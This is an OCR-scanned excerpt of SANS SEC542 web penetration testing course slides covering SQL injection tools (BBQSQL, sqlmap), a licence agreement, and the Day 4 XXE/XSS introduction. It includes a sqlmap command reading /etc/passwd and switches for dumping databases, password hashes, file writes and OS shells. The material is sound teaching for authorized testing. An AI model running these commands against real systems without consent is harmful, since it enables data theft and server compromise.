9. Exercise: Local/Remote File Inclusion 
I 0. SQL Injection Primer 
i I . Discovering SQli 
12. Exercise: Error~Based SQLi 
13. Exploiting SQLi 
14. SQLi Tools 
15. Exercise: sqlmap + ZAP 
16.Summary 
Course Roadmap 
The next section describes a number of popular and powerful SQL injection tools. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
117 
'---' 
'---' 
• Strictly speaking, numerous tools are available for assisting in the 
discovery of SQL injection flaws 
• Unfortunately, few tools dig into SQLi exploitation capabilities 
other than data exfiltration: 
oMore unfortunate, most tools are not maintained 
• Fortunately, we do have sqlmap, which is actively maintained 
o Just grab the current dev version and don't hold your breath on formal 
"releases" 
• Let's have one passing slide on not-being-updated BBQSQL and 
turn attention to the SQLi tool, sqlmap 
'-../ 
'---' 
'---' 
'-../ 
'---' 
'-../ 
\..J 
'---' 
'-../ 
'-../ 
'-../ 
'-../ 
'---' 
Given the attention that SQL injection gets, it should be a foregone conclusion that numerous high-quality open 
source tools would be available. Sadly, that is not the case. Most tools available are badly dated and are no 
longer maintained. Further, they typically provide little functionality beyond data exfiltration. Also, often the 
tools are limited in the DB backends they support. 
Thankfully, we have sqlmap, which is a tremendous tool that is actively maintained. Although this might change 
in the future, sqlmap does not routinely package releases. Rather, the source code and sqlmap.py script are 
actively maintained and freely available. Use the current sqlmap from GitHub rather than the package available 
from your Linux distribution. 
One quick slide on BBQSQL, which, like most SQLi tools, does not seem to be actively maintained, and then 
we will attend to sqlmap. 
118 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._,, 
'-.../ 
'---' 
..._,, 
'-../ 
'---' 
'-._,, 
'---' 
'---' 
'---' 
'---' 
..._,, 
'-../ 
'-../ 
..._,, 
'-..J 
..._,, 
'-../ 
''-.,) 
'---' 
'-----' 
'-' 
'---' 
'-' 
'-../ 
'-' 
BBQSQL 
• BBQSQL is a Python-based framework to ease and speed the 
exploitation of blind SQL injection flaws 
• Performs two types of blind SQL injection attacks: 
o Binary search: Typical technique that splits the character set in half (e.g., 
is the first character of the first table name > 'm') 
o Frequency search: Based on letters' frequency of occurrence in English 
language text: 
• Quite fast against appropriate backend data 
• These attack techniques can be coupled with different indicators 
(e.g., timing, HTTP headers, content, size, and HTTP status code) 
BBQSQL1 provides a Python-based framework targeting the discovery and exploitation of blind SQL injection 
flaws. The tool is a product of the Neophasis Labs and debuted at DEFCON 20.2 BBQSQL serves as a rather 
fast, relatively simple way of testing for and exploiting blind SQL injection flaws. Although a full overview of 
the capabilities is beyond the scope of this quick introduction, a few noteworthy items should be mentioned. 
BBQSQL employs two attack techniques: Binary search and frequency search. This is the way in which 
BBQSQL plays the game of20 questions for blind SQL injection. The binary search serves as the default 
technique and works by splitting the expected character set to be returned in half. For example, return true if the 
first character of the name of the first user is greater than m. If false is returned, then the first character is less 
than or equal tom, and BBQSQL would then split a-m in half and ask the next question. The frequency search 
employs a different tactic that is based on frequency analysis of letters occurring in English text. This can prove 
extremely fast if the dataset queried is standard English text, as opposed to numeric, a hash, or a random 
collection of characters. 
Whether binary or frequency search is employed, BBQSQL can be configured to look for differences indicative 
of true/false across a wide number of values. These include looking at the timing ofresponse, HTTP headers, 
content returned, size of data returned, HTTP status codes, encoding, cookies, and such. (See the link to 
BBQSQL for additional details.) 
References: 
[1] https://github.com/Neohapsis/bbqsql (https://cyber.gd/542 _311) QR 
[2] https://www.defcon.org/images/defcon-20/dc-20-presentations/Toews-Behrens/DEFCON- 
20-Toews-Behrens-BBQSQL.pdf (https://cyber.gd/542 _ 3 l 2) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
l!J-@.l!l 
~ 
·, 
r:i 
. 
• 
• 
I!] I: 
• 
119 
'---" 
\_I
sqlmap: An open source, Python-based, command-line SQL 
injection tool of awesomeness created by Bernardo Damele A.G. 
(@inquisdb) 
1-1$ sqlmap -u http: //www.sec542.org/scanners/sqU. php?name=Zaphod - -tite- read=/ 
let c/passwd 
(!I legal disclaimer: usage of sqlmap for attacking targets without prior 
consent is illegal. It is the end user's responsibility to obey all applicable 
local, state and federal laws. Developers assume no liability and are not 
sible for any misuse or damage caused by this program 
[*I starting at 16:52:07 
Easily the most important tool for SQL injection testing/exploitation 
\_I
'-J 
'---" 
'-..../ 
-...J 
'---" 
'-..../ 
..._, 
'---" 
'-..../ 
'---" 
'-./ 
'-..../ 
...._,, 
The command shown in the slide is: 
$ sqlmap -u http://www.sec542.org/scanners/sqli.php?name=Zaphod --file- 
read=/etc/passwd 
Reference: 
[I] https://github.com/sqlmapproject/sqlmap (https://cyber.gd/542 ~310) 
120 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
...._,, 
...._,, 
-...J 
-...J 
-...J 
-...J 
-...J 
'---" 
...._,, 
-...J 
..._, 
'-./ 
'-..../ 
-...J 
'-./ 
\_I
-...J 
'-J 
'-./ 
...._,, 
-...J 
-...J 
'-J 
..._, 
'-' 
ForAIIYour SQLi Needs 
• If you have a SQL injection task, there is likely a way that sqlmap 
can help you out: 
o Even if it cannot be directly used, often using it in a lab can help guide 
successful testing techniques 
• In-band/inline SQ Li discovery/ exploitation 
• Blind SQ Li discovery/ exploitation 
• MySQL/MS SQL/Oracle/PostgreSQL/SQLite/more ... 
• Integrates with Metasploit/wgaf/Burp/Zal' 
• Features++ 
The feature set of sqlmap is significant and growing. Many tools in this space were point products that seemed 
narrow. sqlmap is rather far from narrow. There is support for MySQL, MS SQL Server, Oracle database, 
PostgreSQL, SQ Lite, and more from a DBMS perspective. 
Equally important, sqlmap supports numerous SQ Li exploitation techniques. Blind timing, error-based, blind 
boolean, stacked queries, UNION, and even more granular SQ Li techniques are employed. A big differentiator 
is that sqlmap can both find SQLi flaws and exploit them, with exploitation moving beyond simple data exfil. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
121 
\._./ 
\._./
i)w3af/ 
\..J 
\..J 
'-.../ 
'-.../ 
'-' 
Even if wielded only as a standalone tool, sqlmap would still be a boon to application testing. However, sqlmap 
also can integrate with additional tools for increased productivity and capability. The way in which sqlmap 
integrates varies. For some tools, the integration is leveraged from within sqlmap. Other tools will initiate the 
integration from their end to leverage sqlmap. 
From within sqlmap, we find direct reference to both Burp Suite (requires pro) and Metasploit. We also 
commonly find tools that can leverage sqlmap for their SQLi needs. Here we find methods for initiating 
integration from w3af, Metasploit, Burp Suite (via extensions/BAPPs), and ZAP. 
122 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-.../ 
'-.../
'-' 
'-.../
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../
'-.../ 
'-.../ 
'-.../
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
\....,.· 
'-.J
'-.../ 
'-' 
'-...--'
'-.J
'-.J
'-.J
'-.../
'-.../ 
'-.../
'-'. 
\..J
'-' 
'-J 
\....,. 
sqlmap: -h and -hh 
• sqlmap supports MANY different command-line switches to help 
discover/exploit SQLi flaws 
• Two verbosity levels of help: 
o Substantial (-h) 
oOh my ... (-hh) 
o ... and, if those aren't enough the Usage Guide provides even more insights1 
• The number of switches can easily be rather overwhelming for 
sqlmap neophytes 
o Let's highlight using key switches that might overwhelm 
The downside of all sqlmap's functionality is that there is a rather overwhelming number of command-line 
switches or configuration options available to us. Although this is, naturally, awesome, it also can be a bit 
daunting for the uninitiated. 
sqlmap includes two different help switches, -h and -hh, which provide a more basic and a more complete 
syntax guide. To get even more details, the GitHub repo includes a usage page in the wiki, which provides quite 
a bit of detail. 
We will look at use cases for some of the more important command-line switches, which might be a bit daunting 
to those unfamiliar with sqlmap. 
Reference: 
[l] https://github.com/sqlmapproject/sqlmap/wiki/Usage (https://cyber.gd/542~514) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
123 
\...../ 
'--' 
sq I map: Initial Targeting 
The following switches can help start discovery from sqlmap even 
without much target info: 
-u 
- A URL to kick off sqlmap 
--crawl - Spiders the site trying to discover entry points for testing 
--forms -Target forms for injection 
--dbms 
- If we already know (or have a good guess) about the backend 
DB, we can inform sqlmap 
\_,.; 
\_,.; 
\...../ 
\_,.; 
'-../
\...../ 
\_,.; 
\_,.; 
\...../ 
'-../ 
'-./ 
'-../ 
\_,.; 
sqlmap can be used as the SQLi starting point. From this vantage point, we could use sqlmap to discover SQL 
injection flaws in the first place. The following switches, in particular, are useful to let sqlmap do the discovery. 
-u - A URL to kick off sqlmap 
--crawl - Spiders the site trying to discover entry points for testing 
--forms - Target forms for injection 
--dbms - Ifwe already know (or have a good guess) about the backend DB, we can inform sqlmap 
124 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
'-./ 
'-./ 
'-../
'-../
'-../
'-../
\_,.; 
'-./ 
'-../ 
\...../ 
\_,.; 
'-../ 
'-./ 
'-../
'-./ 
'-../
'-J 
'-../ 
'-../ 
'-J 
\...../ 
\...../ 
\_,.;
'--' 
sqlmap:Auth/Sessions/Proxies 
If you have already interacted/ authenticated to the target, these 
switches can prove useful: 
-r / -1 
- Captured HTIP Request or proxy log as starting point: 
o Can easily help bridge an authentication gap 
--cookie - Manually set cookies (e.g., --cookie 'SESSID=42') 
--proxy - Have sqlmap go through Burp/ZAP or another proxy (e.g., -- 
proxy http:f /127.0.0.1:8081) 
For us, as testers, our most common use case would be having already found evidence of a SQL injection flaw 
or a likely target. We would prime sqlmap with targeting information rather than forcing it to spider, target 
forms, and so on. The following switches prove particularly important when coupling sqlmap with information 
from our interception proxy as well as feeding that info back into the proxy: 
-r I -l - Captured HTTP Request or proxy log as starting point 
--cookie -Manually set cookies (e.g., --cookie 'SESSID=42') 
--proxy -Have sqlmap go through Burp/ZAP or another proxy (e.g., --proxy http:l/127.0.0.1:8081) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
125 
sq I map: Proxies and Active Sessions 
• Although the - -proxy switch mentioned previously can be quite handy, 
there is some nuance to the behavior 
• Imagine you have authenticated to the application in a browser going 
through the proxy 
'\#>l>(ij 
Many testers mistakenly 
assume sending sqlmap 
through the proxy 
automatically solves the 
authentication problem 
• The proxies can handle this, but typically don't by default 
The --proxy switch is tremendously useful for us because the proxy is most likely our primary vantage point 
for all application testing activities. Leaning on our proxy can also be extremely useful when dealing with 
authentication. Although sqlmap does support various forms of authentication, it is typically not as robust as 
what is found in our proxies or can be achieved by us manually through our proxy. 
One thing that often bites folks when using the --proxy switch is mistakenly assuming that the proxy 
automatically transforms requests that are sent through it. Most importantly, if you have an authenticated session 
active in your proxy, sqlmap does not automatically inherit the session. We need to configure our proxies to 
support this. 
126 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
v 
.'--' 
'-' 
'--' 
'--' 
'--' 
'-' 
'-' 
'-' 
'--' 
'-J 
'---' 
'-' 
'-J 
'---' 
'---' 
l'H 
'-J 
'--' 
'---' 
'-../ 
'-J 
'--' 
'-../ 
'---' 
'--' 
'-../ 
'-../ 
'-' 
'-' 
'-' 
'--' 
'--' 
v 
'-.J 
'-.J
'-J 
'-.J
'-../ 
'---' 
'-J 
'-J 
sqlmap: Riding ZAP/Burp Sessions 
These screenshots show where in ZAP and Burp we would go to configure the tools to automatically transform 
sqlmap's requests as they pass through the proxy. 
r\ 
r\ 
ZAP's "Global HTTP State" option was moved to Tools-> Options-> Connections in ZAP version 2.7.0. Note it 
is not enabled by default. The option was formerly available under Edit-> Enable Session Tracking (Cookie). 
While this works, the preferred method of handling sessions in ZAP seems to be moving to using the session 
management portion of site contexts. 
s1ssion 
General 
Exclude from Proxy 
Exclude from Scanner 
Exclude from Spider 
-,- Conte-xts 
" 1 :Default Co-nt,art 
l: !ndude m Context 
l: Exclude from Conte 
Structure 
'rechnctcqy 
1: Alithenticatlon 
1: Users 
1: fcrrnd User 
l: Authorization 
1: Alert Filters 
Monitor Clients 
Exclude from websccxats 
5 121511712,0." 
GET 
7 12!5fl7 12:(L. 
GET 
9 l 2!5/l 7 12,(L 
GET 
27 1215/1712,0 ... 
GET 
3:2 12]511712:CL. 
GET 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
127 
'--' 
In Burp, we will need to update the Session Handling Rules under Options->Sessions to include the Proxy tool: 
Yau can define session handling rules to make Burp perform specific actions when making HTTP requests. Each rule has a defined 
scope Uor particular tools, URLs or parameters), and can perform actions such as adding session cookies, logging in to the application, 
or checking session validity. Before each recuest is issued, Burp applies in sequence each of the rules that are in-scope for the 
request. 
I,,,, Add 
; ; Em1tlled 
l-OescrlpUon 
I Tools 
i:,:,, :- ·;;-;;.;---i 
D 
use cookies from Burp's cookie jar 
Spider and Scanner 
~ 
/_. .... ,_, 
, __ " 
~ 
I Dupllcate j 
Proxy not included 
by default 
The default behavior is to include only the Spider and Scanner. 
Ir 
Note: The above tweaks can have a performance impact, so we recommend dynamically setting them on an as- 
needed basis. 
128 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-....,/ 
..__, 
'-.../ 
'-../ 
'-../ 
'-../ 
'-../ 
..__, 
'-../ 
'-../ 
'-../ 
'--' 
'-../ 
'-.../ 
'--' 
' '-../ 
'-../ 
'-../ 
'--' 
..__, 
'-../ 
'-../ 
'-.../ 
'-../ 
'-.../ 
'-.,_/ 
'-.,_/
'--' 
'-../ 
'-../ 
'--' 
'-.,_/ 
\,__.I
'--' 
..__, 
sqlmap: HTTP Headers 
Customizing the HTTP headers sqlmap sends could be simply a 
good practice or required for success: 
--user-agent -The default user agent of sqlmap/#. # is not 
terribly subtle 
• If you need to be stealthy for the penetration test or need to avoid 
W AFs/ admins that scrutinize user agents 
- - ref erer - Applications and WAFs are more commonly 
validating that the HTTP Referer matches the expected flow 
• Although useful to know about manually setting the HTTP Referer, 
simply using a previous request (-r) or wielding sqlmap via the proxy 
would be preferred 
Modifying HTTP headers is something sqlmap exposes should we have a need or desire to alter the default 
behavior. These enable us to update the user agent and the referrer: 
--user-agent -The default user agent of sqlmap/#. # is not terribly subtle. 
lfyou need to be stealthy for the penetration test or need to avoid WAFs/admins that scrutinize user agents: 
--referer -Applications and WAFs are more commonly validating that the HTTP Referer matches the 
expected flow. 
Although useful to know about manually setting the HTTP Referer, simply using a previous request (-r) or 
wielding sqlmap via the proxy would be preferred. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
129 
'-../ 
'--" 
. sqlrnap: DB .Enumeration 
Easily dump DB schema/metadata without having to remember the 
nuance for each DB: 
--schema - Dump the entire DBMS database, table, and column names 
--exclude-sysdbs -To ignore system databases 
--dbs/--tables/--columns -These switches can be used to be more 
tactical than dumping the full list as with schema 
-D/-:-:T - Can be coupled with the above switch to, for example, list only 
tables in the Customer DB (-D Customer --tables) 
'-../ 
'-._., · 
'--' 
'--" 
'--' 
'---' 
'-../ 
'-._/ 
'---' 
'-../ 
'--' 
'--" 
'--' 
Dumping the schema/metadata from the backend is a key step that sqlmap makes significantly easier without 
our having to bang our heads against syntax needlessly. 
--schema - Dump the entire DBMS database, table, and column names 
--exclude-sysdbs - To ignore system databases 
--dbs/--tables/--columns - These switches can be used to be more tactical than dumping the full 
list as with schema 
-D/-T - Can be coupled with the above switch to, for example, list only tables in the Customer DB (-D 
Customer --tables) 
130 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-' 
'--" 
'--" 
'-J 
'--' 
'-J 
'-J 
'--' 
'-" 
'-" 
'---' 
'--' 
'-J 
'-" 
'--' 
'-" 
\..../ 
\..../ 
'-.../ 
'-" 
'--' 
'-" 
\J 
\..../ 
'--' 
sqlmap: DB Data Exfil 
After enumerating the metadata, it is on to stealing the 
data, or proving you could: 
--all 
- Dump all data && metadata (yikes!) 
--count - No data exfiltrated, simply provides a count of records 
• Quite useful when dealing with sensitive data stores 
--dump 
- Steals data given the applied constraints (e.g., -D Orders -T 
Customers --dump) 
--dump-all - Exfiltrates all table data 
--search 
- Scour DB/table/column for a string (e.g., user or pass) 
Exfiltrating data is the primary concern for most organizations when considering SQL injection. Now that the 
metadata has been enumerated, the following switches can exfiltrate data from interesting DBs, tables, or 
columns. These can also prove that data can be exfiltrated without actually stealing it with the --count switch. 
--all - Dump all data && metadata (yikes!) 
--count - No data exfiltrated, simply provides a count ofrecords 
--dump - Steals data given the applied constraints (e.g., -D Orders -T Customers --dump) 
--dump-all - Exfiltrates all table data 
--search - Scour DB/table/column for a string (e.g., user or pass) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
131 
I.._./ 
Key Switches: Beyond DB. Data Exfil 
Although data exfil is the most common focus, these switches show 
off sqlmap's capability to do more: 
--users 
- Enumerate DB user accounts 
--passwords 
- Show DB user account hashes 
--file-read 
- Download files to attack system 
--file-write - Upload files to DB system 
--reg-read/--reg-wri te - Read/Write Windows registry keys 
- -reg-add/- -reg-del 
- Add/Delete Windows registry keys 
SEC542 [Web App Penetration Testing and Ethical Hacking 
131 
'-.../ 
'--" 
'--' 
'--" 
'-.../ 
'---' 
'---' 
'--" 
'--' 
.____, 
.____, 
'-' 
'-' 
'-' 
'--" 
sqlmap switches for digging in deeper on the database server itself. Extremely useful for databases that targets 
suggest "don't contain anything sensitive." 
--users - Enumerate DB user accounts 
--passwords - Show DB user account hashes 
--file-read- Download files to attack system 
--file-write - Upload files to DB system 
--reg-read/--reg-wri te - Read/Write Windows registry keys 
--reg-add/--reg-del -Add/Delete Windows registry keys 
132 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--" 
'-../ 
'--' 
'--' 
'--' 
'-' 
'-----' 
'-' 
'---' 
'-" 
'--' 
'-' 
,.___,, 
'-' 
'-.../ 
'--' 
'-" 
'--" 
'-----' 
'--' 
'-' 
'-' 
Key Switches: Post Exploitation++ 
Easily the most popular functionality associated with sqlmap, which 
can turn SQLi into a full-on compromise: 
- -pri v-esc - Escalate privileges of DB 
--sql-query/--sql-shell - Run single SQL query or get simulated 
interactive SQL shell 
--os-cmd/--os-shell 
- Exec single OS command or get simulated 
interactive OS shell 
--os-pwn 
- OOB Metasploit shell/VNC/Meterpreter 
See caveats in the notes about utility of these switches 
Without question, the following options are the most talked about sqlmap capabilities. Most organizations, and 
even security professionals, are unaware of the potential for SQL injection to yield these sorts of capabilities. 
--priv-esc - Escalate privileges of DB 
--sql-query/--sql-shell - Run single SQL query or get simulated interactive SQL shell 
--os-cmd/--os-shell- Exec single OS command or get simulated interactive OS shell 
--os-pwn - 008 Metasploit shellNNC/Meterpreter 
Some caveats: These techniques typically require the database server to be running a web server, with a web 
root that the database account can write to, and that we can reach. Significant preconditions exist in many 
scenarios. This is most effective after pivoting or during internal engagements in which the DB server is more 
directly accessible. In addition, the --os-pwn option requires an out-of-band connection to be available. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
133 
'---' 
'-../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
INJECTION 
I. Session Tracking 
2. Session Token Gathering and Session fixation 
3. Bypass flaws 
4. Exerdse: Authentication Bypass 
5. Vulnerable Web Ap.ps: Mutillidae 
6. Command injection 
7. Exerdse: Command Injection 
8. file lnclusien 
Directory Traversal 
9. txe,y,cis,e: Local/Remote File Inclusion 
re. 
11. Discoverimr 
Exercise: E.rror~Based SQLi 
IS. Exercise: sqlmap + ZAP 
Summarv 
SEC542 [Web App Penetration Testing and Ethical Hacking 
IJ4 
'-../ 
'-.J 
'-.../ 
'-.../ 
'-.../ 
'-.../ 
'-../ 
'-.../ 
'-.../ 
'-.../ 
'-' 
'-../ 
'-.../ 
'-../ 
'-.J 
'-../ 
Course Roadmap 
'---' 
'--' 
The final exercise of 542.3 will be to use both sqlmap and ZAP. 
134 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-' 
'-.../ 
'-../ 
'-.../ 
'-../ 
'-' 
'---' 
'-"' 
'-../ 
'---' 
'-"' 
'-' 
'-' 
'-" 
'-.../ 
'--' 
'--' 
'---' 
'---' 
'-' 
" 
SEC542Workbook: sqlmap + ZAP 
~ ....:::- .- 
Exercise 3.5: sqlmap + ZAP 
SEC542 Workbook: sqlmap + ZAP 
Please go to Exercise 3.5 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
135 
..._, 
\._,I 
\._,I 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
• Session Tracking 
2. Session Token Gathering and Session Fixation 
3. Bypass Flaws 
4.. Exercise: Authentication Bypass 
5. Vulnerable Web 
Mutillidae 
6. Command lniection 
7. Exercise: 
file Inclusion aml Directory Traversal 
9. Exercise: Local/Remote file Inclusion 
i 0. SQL Injection Pr.imer 
I I. Discovering SQli 
12. Exercise: Error.Based SQli 
13. Exploiting SQLi 
14. SQli Tools 
I S .• Exercise: 
16. Summary 
SECS42 I Web App Penetration Testing and Ethical Hacking 
136 
'-.J 
'----" 
'----" 
'----" 
'----" 
'----" 
'-.J 
'----" 
'----" 
'----" 
'-' 
'-J 
'----" 
'----" 
'----" 
'--" 
Course Roadmap 
'----" 
'-J 
That wraps up 542.3; the summary is next. 
\._,I 
'--" 
'-.J 
'----" 
'-.J 
'-J 
'-J 
'----" 
..._, 
..._, 
'--" 
'-.J 
'-.J 
'-.J 
'----" 
'-.J 
'----" 
'-../ 
~ 
136 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--" 
'----" 
Summary 
• That wraps up 542.3 
• Today we discussed: 
o Session management and authentication bypass 
o Injection techniques, including command injection, LFI, and RFI 
o We ended with a deep dive on SQL injection 
• Next up: 542-4, which will investigate XXE and XSS 
• Thankyou! 
That wraps up 542.3. 
Today, we discussed: 
• 
Session management and authentication bypass 
• 
Injection techniques, including command injection, LFI, and RFI 
• 
We ended with a deep dive on SQL injection 
Next up: 542.4, where we will investigate XXE and XSS. 
Thank you! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
137 
~ 
-~ 
- 
~ 
- 
- 
- 
' 1- 
! SEGS42 I WEB A.PP PENETRA"DON TESTING AND ETHIGAI... HA.GKING 
" 
' 
C 
542.4 
Eand 
s 
----- 
\..._; 
Copyright© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson. Al1 rights reserved to Seth Misenar, Eric 
Conrad, Kevin Johnson, and/or SANS Institute. 
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE 
AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE 
ASSOCIATED WITH THE SANS COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT 
BETWEEN YOU (THE "USER") AND THE SANS INSTITUTE FOR THE COURSEWARE. YOU 
AGREE THAT THIS AGREEMENT IS ENFORCEABLE LIKE ANY WRITTEN NEGOTIATED 
AGREEMENT SIGNED BY YOU. 
With the CLA, the SANS Institute hereby grants User a personal, non-exclusive license to use the 
Courseware subject to the terms of this agreement. Courseware includes all printed materials, 
including course books and lab workbooks, as well as any digital or other media, virtual machines, 
and/or data sets distributed by the SANS Institute to the User for use in the SANS class 
associated with the Courseware. User agrees that the CLA is the complete and exclusive 
statement of agreement between The SANS Institute and you and that this CLA supersedes any 
oral or written proposal, agreement or other communication relating to the subject matter of this 
CLA. 
BY ACCEPTING THIS COURSEWARE, YOU AGREE TO BE BOUND BY THE TERMS OF THIS 
CLA. BY ACCEPTING THIS SOFTWARE, YOU AGREE THAT ANY BREACH OF THE TERMS 
OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO THE SANS 
INSTITUTE, AND THAT THE SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY 
INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, 
OR OTHER EQUITABLE RELIEF. 
If you do not agree, you may return the Courseware to the SANS Institute for a full refund, if 
applicable. 
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works 
based upon all or any portion of the Courseware, in any medium whether printed, electronic or 
otherwise, for any purpose, without the express prior written consent of the SANS Institute. 
Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any 
way, shape, or form without the express written consent of the SANS Institute. 
If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall 
be deemed to be severable from this CLA and shall not affect the remainder thereof. An 
amendment or addendum to this CLA may accompany this courseware. 
SANS acknowledges that any and all software and/or tools, graphics, images, tables, charts or 
graphs presented in this courseware are the sole property of their respective 
trademark/registered/copyright owners, including: 
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back 
to My Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, 
iLife, iMac, iMessage, iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, 
iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac, Mac Logo, MacBook, 
MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, 
Retina, Safari, Siri, Spaces, Spotlight, There's an app for that, Time Capsule, Time Machine, 
Touch ID, Xcode, Xserve, App Store, and iCloud are registered trademarks of Apple Inc. 
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA. 
SEC542_ 4_001_02 
'--' 
'-' 
.._,, 
'----" 
'--' 
'----" 
,.__,, 
\._; 
.._,, 
'----" 
'-J 
\._; 
.._,, 
\._; 
.._,, 
'----" 
'-....;' 
\._; 
'-J 
'----" 
'-J 
\._; 
'-J 
'----" 
\._; 
'-J 
\._; 
'-J 
'--' 
\._; 
\._; 
'-J 
'-J 
\._; 
'-J 
\._; 
\._; 
\._; 
\._; 
\._; 
.._,, 
SEC542.4 
XXEandXSS 
Copyright 2018 Seth Misenar (GSE #28), Eric Conrad (GSE #13), Kevin Johnson 
Version DO I 02 
Welcome to SANS Security 542, Web App Penetration Testing and Ethical Hacking, Day 4! 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
SEC642 
Advanced Web App Penetration 
Testing & Ethical Hacking 
SEC660 
Advanced Penetration 
& Ethical Hacking 
SEC550 
Active Defense, Offensive 
Countermeasures & Cyber Deception 
Wireless. Penetration Testing 
and E~hkal Hacking 
'--' 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
Soda/ Engineering 
for PenetrntionTester.s 
SEC573 
Automating Information 
Security with Python 
This slide shows the SANS Penetration Testing Curriculum, offering a variety of courses all focused on helping 
organizations improve their security through the use of penetration testing, vulnerability analysis, and Red Teaming. 
2 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-.J 
'-' 
'-..-/ 
'-../ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-../ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-..-/ 
'-' 
'-' 
'-..-/ 
'-../ 
'-..-/ 
'-..-/ 
'-..-/ 
'-../ 
'-../ 
'-..-/ 
'-../ 
'-' 
'-' 
'-..-/ 
'-..-/ 
'-../ 
'-.J 
Table of Contents 
XXE 
. 
EXERCISE: XXE 
. 
Document Object Model (DOM) 
. 
Cross-Site Scripting (XSS) Primer 
. 
Classes of XSS 
. 
EXERCISE: XSS 
. 
Discovering XSS 
. 
XSS Impacts 
. 
EXERCISE: HTML Injection 
. 
XSSTools 
. 
BeEF 
. 
EXERCISE: BeEF 
. 
AJAX 
. 
- 
5 
18 
20 
27 
44 
66 
68 
85 
93 
95 
110 
120 
122 
542.4 Table of Contents 
This table of contents outlines our plan for 542.4. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
3 
TableiofContents 
API Attacks 
. 
Data Attacks 
. 
EXERCISE: AJAX XSS 
. 
Summary 
. 
542.4 Table of Contents 
Here is the rest of the Table of Contents for 542.4. 
4 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
..__,, 
. ..__,, 
. .__,, 
'--' 
- 
I 
'-' 
'-" 
134 
'-../ 
140 
'-J 
148 
'--' 
151 
'-../ 
'-../ 
'-../ 
'--' 
'-----" 
'---' 
'-J 
'-' 
'-J 
'---' 
'-' 
'-' 
..__,, 
'---' 
'-' 
'-----" 
'--' 
'-' 
'-J 
'-..../ 
'-J 
'-J 
'-----" 
'-----" 
'--' 
'--' 
'--' 
'-../ 
'--/ 
..__,, 
'--' 
'-----" 
'-../ 
'-J 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEANDXSS 
t.XXE 
2. Exercise: XXE 
3. Document Object Model (DOH) 
4. Cross-Site Scripting ~KSS) Primer 
5, Classes of XSS 
6. Exercise: XSS 
· 7. Discoverning XSS 
8. XS$ Impacts 
9. Exercise: HTML Injection 
10. XSS Tools 
11.BeEF 
12. Exercise: BeEf 
13.AJAX 
14. API Attacks 
I S. Data Attacks 
16. Exercise: AJAX XSS 
11. Summary 
Course Roadmap 
Welcome to Security 542, Web App Penetration Testing and Ethical Hacking: Day 4. 
Today we will discuss XXE and XSS. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
5 
